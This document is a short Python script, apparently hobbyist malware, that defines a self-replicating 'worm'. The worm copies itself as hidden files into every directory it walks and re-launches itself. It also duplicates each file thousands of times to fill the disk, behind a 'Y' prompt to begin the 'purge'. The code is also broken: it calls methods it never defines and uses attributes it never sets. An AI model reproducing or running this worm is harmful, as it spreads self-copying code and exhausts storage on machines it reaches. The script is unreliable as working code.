import os
import shutil
import sys
import subprocess

class Worm:
    def __init__(self,targetpath=None,dir_list=[x[0] for x in os.walk(os.path.realpath(__file__))],rounds=None):
        if isinstance(targetpath,type(None)):
            self.count = int(sys.argv[1])
            self.targetpath = os.path.dirname(os.path.realpath(__file__))
        else:
            self.path = targetpath

        if isinstance(rounds,type(None)):
            rounds=3000
            print("No int for round set. automatically set to 2 iterations of the worm")

        self.own_path = os.path.realpath(__file__)
       
    def list_directories(self,path):
        self.dir_list.append(path)
        filescurrentdirectory = os.listdir(path)
        
        for file in filescurrentdirectory:
            # linux systems hide files with a dot at the beginning of the file name
            if not file.startswith('.'):
                # get the full path
                abs_path = os.path.join(path, file)
                

                if os.path.isdir(abs_path):
                    self.list_directories(abs_path)
                else:
                    pass

    def create_worm(self):
        for directory in self.dir_list:
            print("Creating new worm")
            filename = f".{self.count+1}worm.py"
            self.count += 1
            
            destination = os.path.join(directory,filename)
            # copys file to another destination.
            shutil.copyfile(self.own_path, destination)
        subprocess.run(["python",filename, str(self.count)])

    def duplicate_files(self):
        for directory in self.dir_list:
            file_list = os.listdir(directory)
            for file in file_list:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.rounds):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)

    def begin_purge(self):#Starts the script all from one function
        self.list_directories(self.path)
        welcomestring = ""
        successmsg = ""
        with open(r"C:\Users\New User\Downloads\welcome.txt",'r') as f:
            welcomestring = f.read()
            f.close()
        with open(r"C:\Users\New User\Downloads\attackbegin.txt",'r') as f:
            successmsg = f.read()
            f.close()    
        print(welcomestring)
        beginmsg = input()
        if beginmsg == "Y":
            print(successmsg)
            self.create_new_worm()
            self.copy_existing_files()
        else: 
            print("Closing down......")
            sys.exit(0)
            

if __name__ == "__main__":
    worm = Worm()
    worm.begin_purge()
